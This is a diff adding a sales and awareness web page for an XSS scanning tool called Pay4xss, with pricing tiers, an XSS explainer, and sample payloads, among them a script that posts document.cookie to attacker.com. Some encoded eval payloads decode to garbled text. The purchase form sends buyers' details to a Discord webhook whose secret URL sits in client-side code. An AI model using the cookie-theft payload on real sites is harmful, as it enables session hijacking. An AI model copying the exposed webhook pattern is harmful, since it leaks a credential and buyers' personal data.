@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Pay4xss - XSS Vulnerability Awareness</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
+</head>
+<body>
+    <header class="bg-primary text-white py-3">
+        <div class="container">
+            <h1 class="display-4">Pay4xss Tool</h1>
+            <p class="lead">Educational Platform for Understanding and Mitigating XSS Vulnerabilities</p>
+        </div>
+    </header>
+
+    <section class="pay4xss-pro py-5">
+        <div class="container">
+            <h2 class="section-title">About Pay4xss Pro+</h2>
+            <p>Pay4xss Pro+ is a powerful, web-based tool designed to detect and mitigate XSS vulnerabilities in websites. It offers advanced features, including automated scanning for common and custom XSS payloads. The tool is intended for both beginners and professionals, making it easy to find vulnerabilities and test web applications' security posture. Pay4xss Pro+ provides a user-friendly interface with insightful reports and recommendations for enhancing website security. Key features include:</p>
+            <ul class="list-group">
+                <li class="list-group-item"><strong>Automated Scanning:</strong> Quickly scans websites for potential XSS flaws.</li>
+                <li class="list-group-item"><strong>Advanced Payload Detection:</strong> Detects both basic and complex XSS payloads.</li>
+                <li class="list-group-item"><strong>Detailed Reports:</strong> Provides clear, actionable results with guidance on remediation.</li>
+                <li class="list-group-item"><strong>Real-Time Testing:</strong> Test your website directly for vulnerabilities in real-time.</li>
+                <li class="list-group-item"><strong>Customizable Scanning:</strong> Users can add custom payloads to tailor tests to their specific needs.</li>
+            </ul>
+            <p>This tool is perfect for penetration testers, security researchers, and web developers aiming to secure their applications against XSS attacks.</p>
+    
+            <!-- Screenshot Section -->
+            <h5 class="mt-4">Tool Screenshot:</h5>
+            <img src="./Pay4xss.PNG" alt="Pay4xss Pro+ Tool Screenshot" class="img-fluid" />
+        </div>
+    </section>
+
+    <section class="pricing py-5">
+        <div class="container">
+            <h2 class="section-title">Buy Pay4xss Tool</h2>
+            <p>Choose the version that best suits your needs:</p>
+                
+            <div class="row">
+                <!-- Pay4xss Card -->
+                <div class="col-md-4 mb-4">
+                    <div class="card">
+                        <div class="card-header bg-primary text-white">
+                            <h4><i class="fa fa-cogs"></i> Pay4xss</h4>
+                        </div>
+                        <div class="card-body">
+                            <h5 class="card-title">Price: <strong>1000Rs</strong></h5>
+                            <p>A basic version of Pay4xss designed for simple vulnerability scanning.</p>
+                            <ul class="list-group">
+                                <li class="list-group-item"><i class="fa fa-check"></i> Basic scanning for XSS</li>
+                                <li class="list-group-item"><i class="fa fa-check"></i> Quick results</li>
+                                <li class="list-group-item"><i class="fa fa-check"></i> Simple interface</li>
+                            </ul>
+                        </div>
+                        <div class="card-footer">
+                            <button class="btn btn-primary btn-block" onclick="openPurchaseModal('Pay4xss')">Buy Now</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pay4xss Pro+ Card -->
+                <div class="col-md-4 mb-4">
+                    <div class="card">
+                        <div class="card-header bg-success text-white">
+                            <h4><i class="fa fa-shield-alt"></i> Pay4xss Pro+</h4>
+                        </div>
+                        <div class="card-body">
+                            <h5 class="card-title">Price: <strong>8000Rs</strong></h5>
+                            <p>Full version with all features including real-time testing, customizable scanning, and detailed reports.</p>
+                            <ul class="list-group">
+                                <li class="list-group-item"><i class="fa fa-check"></i> Real-time testing</li>
+                                <li class="list-group-item"><i class="fa fa-check"></i> Customizable scanning</li>
+                                <li class="list-group-item"><i class="fa fa-check"></i> Detailed, actionable reports</li>
+                                <li class="list-group-item"><i class="fa fa-check"></i> Full XSS vulnerability detection suite</li>
+                            </ul>
+                        </div>
+                        <div class="card-footer">
+                            <button class="btn btn-success btn-block" onclick="openPurchaseModal('Pay4xss Pro+')">Buy Now</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Pay4xss Hunts Version Card -->
+                <div class="col-md-4 mb-4">
+                    <div class="card">
+                        <div class="card-header bg-warning text-white">
+                            <h4><i class="fa fa-search-plus"></i> Pay4xss Hunts Version</h4>
+                        </div>
+                        <div class="card-body">
+                            <h5 class="card-title">Price: <strong>2000Rs</strong></h5>
+                            <p>Advanced scanning with additional hunts for detecting complex XSS vulnerabilities.</p>
+                            <ul class="list-group">
+                                <li class="list-group-item"><i class="fa fa-check"></i> Advanced scanning features</li>
+                                <li class="list-group-item"><i class="fa fa-check"></i> Additional payload detection</li>
+                                <li class="list-group-item"><i class="fa fa-check"></i> Enhanced reporting</li>
+                            </ul>
+                        </div>
+                        <div class="card-footer">
+                            <button class="btn btn-warning btn-block" onclick="openPurchaseModal('Pay4xss Hunts Version')">Buy Now</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="intro py-5">
+        <div class="container">
+            <h2 class="section-title">What is XSS?</h2>
+            <p>
+                <strong>Cross-Site Scripting (XSS)</strong> is one of the most common vulnerabilities found in web applications. It allows attackers to inject malicious scripts into web pages that are then executed in the browser of a user who visits the page. These attacks can steal sensitive data, hijack user sessions, or even deliver malware.
+            </p>
+        </div>
+    </section>
+
+    <section class="types-of-xss py-5 bg-light">
+        <div class="container">
+            <h2 class="section-title">Types of XSS Vulnerabilities</h2>
+            <div class="row">
+                <div class="col-md-4">
+                    <h4>Reflected XSS</h4>
+                    <p>Occurs when the input is immediately reflected back to the user without proper sanitization, allowing the attacker to inject malicious code.</p>
+                </div>
+                <div class="col-md-4">
+                    <h4>Stored XSS</h4>
+                    <p>Malicious input is stored on the server (e.g., in a database) and served to users on subsequent visits, potentially affecting multiple users.</p>
+                </div>
+                <div class="col-md-4">
+                    <h4>DOM-Based XSS</h4>
+                    <p>Occurs when the payload is executed due to insecure client-side JavaScript manipulation of the DOM, rather than from a server-side issue.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="payloads py-5">
+        <div class="container">
+            <h2 class="section-title">XSS Payload Examples</h2>
+            <p>These are basic and advanced payloads commonly used to exploit XSS vulnerabilities:</p>
+            <h5 class="h4">Basic Payloads:</h5>
+            <pre><code>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src="x" onerror="alert('XSS')"&gt;
+&lt;input type="text" value="&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;
+            </code></pre>
+
+            <h5 class="h4">Advanced Payloads:</h5>
+            <pre><code>
+&lt;script&gt;eval(atob('Y29uZnJvbnQoYWRkRXZlbnQoJ3h0dHBzOi8vZXhhbXBsZS5jb20nKSk='));&lt;/script&gt;
+&lt;script&gt;fetch('https://attacker.com', {method: 'POST', body: document.cookie});&lt;/script&gt;
+&lt;script&gt;document.body.innerHTML = '&lt;img src="x" onerror="eval(atob(\'Y29uZnJvbnQoYWRkRXZlbnQoJ3h0dHBzOi8vZXhhbXBsZS5jb20nKSk=\\'));"&gt;';&lt;/script&gt;
+            </code></pre>
+        </div>
+    </section>
+
+    <section class="impact py-5 bg-light">
+        <div class="container">
+            <h2 class="section-title">Impact of XSS Vulnerabilities</h2>
+            <p>XSS vulnerabilities can lead to severe consequences, including:</p>
+            <ul class="list-group">
+                <li class="list-group-item"><i class="fa fa-check"></i> Stealing user credentials (e.g., login sessions, passwords)</li>
+                <li class="list-group-item"><i class="fa fa-check"></i> Injecting malicious content into web applications</li>
+                <li class="list-group-item"><i class="fa fa-check"></i> Redirecting users to phishing websites</li>
+                <li class="list-group-item"><i class="fa fa-check"></i> Delivering malicious software to users</li>
+            </ul>
+        </div>
+    </section>
+
+    <section class="buy-now py-5">
+        <div class="container">
+            <h2 class="section-title">Ready to Buy Pay4xss?</h2>
+            <button class="btn btn-primary btn-lg" data-bs-toggle="modal" data-bs-target="#purchaseModal">Purchase Now</button>
+        </div>
+    </section>
+
+    <section class="project-info py-5">
+        <div class="container">
+            <h2 class="section-title">Project by DIT Developers</h2>
+            <p>Pay4xss is a project developed by <strong>DIT Developers</strong> (Digital Information Technology). We are a passionate team dedicated to improving web security through tools and education. Our mission is to help developers, security researchers, and businesses stay ahead of the evolving cybersecurity landscape. By raising awareness of vulnerabilities such as XSS and providing accessible tools like Pay4xss, we aim to make the web a safer place for all.</p>
+        </div>
+    </section>
+
+    <footer class="bg-dark text-white text-center py-3">
+        <p>&copy; 2025 Pay4xss Tool - All Rights Reserved</p>
+    </footer>
+    <!-- Modal -->
+    <div class="modal fade" id="purchaseModal" tabindex="-1" aria-labelledby="purchaseModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="purchaseModalLabel">Purchase Tool</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="purchaseForm">
+                        <div class="mb-3">
+                            <label for="fullName" class="form-label">Full Name</label>
+                            <input type="text" class="form-control" id="fullName" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="linkedin" class="form-label">LinkedIn Profile</label>
+                            <input type="url" class="form-control" id="linkedin" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="email" class="form-label">Email Address</label>
+                            <input type="email" class="form-control" id="email" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="description" class="form-label">Description (Why you want the tool)</label>
+                            <textarea class="form-control" id="description" rows="3" required></textarea>
+                        </div>
+                        <div class="mb-3">
+                            <label for="toolName" class="form-label">Tool</label>
+                            <select id="toolName" class="form-control" required>
+                                <option value="Pay4xss">Pay4xss</option>
+                                <option value="Pay4xss Pro+">Pay4xss Pro+</option>
+                                <option value="Pay4xss Hunts Version">Pay4xss Hunts Version</option>
+                            </select>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary" onclick="submitForm()">Submit</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Open purchase modal and set tool name
+        function openPurchaseModal(toolName) {
+            document.getElementById('toolName').value = toolName;
+            var myModal = new bootstrap.Modal(document.getElementById('purchaseModal'));
+            myModal.show();
+        }
+
+        // Send form data to Discord webhook
+        function submitForm() {
+            const fullName = document.getElementById('fullName').value;
+            const linkedin = document.getElementById('linkedin').value;
+            const email = document.getElementById('email').value;
+            const description = document.getElementById('description').value;
+            const toolName = document.getElementById('toolName').value;
+
+            const data = {
+                fullName,
+                linkedin,
+                email,
+                description,
+                toolName
+            };
+
+            sendToDiscord(data);
+        }
+
+        function sendToDiscord(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1332046326996795483/oSdcJWfpz7LfF1JFCFZea8VvWxvQeMBqGRdoBEUJL0HjN9PabXqOhWvqQ-s5Clm9JbIm'; // Replace with your Discord webhook URL
+
+            const message = {
+                content: `New purchase request:
+                **Full Name:** ${data.fullName}
+                **Linkedin:** ${data.linkedin}
+                **Email:** ${data.email}
+                **Description:** ${data.description}
+                **Tool Purchased:** ${data.toolName}`
+            };
+
+            console.log("Sending data to Discord:", message); // Log the message data
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            }).then(response => {
+                if (response.ok) {
+                    alert("Thank you for your purchase request! We'll get back to you soon.");
+                    var myModal = new bootstrap.Modal(document.getElementById('purchaseModal'));
+                    myModal.hide();
+                } else {
+                    alert("There was an issue with the request. Please try again.");
+                }
+            }).catch(error => {
+                alert("Error sending request: " + error);
+            });
+        }
+    </script>
+</body>
+</html>
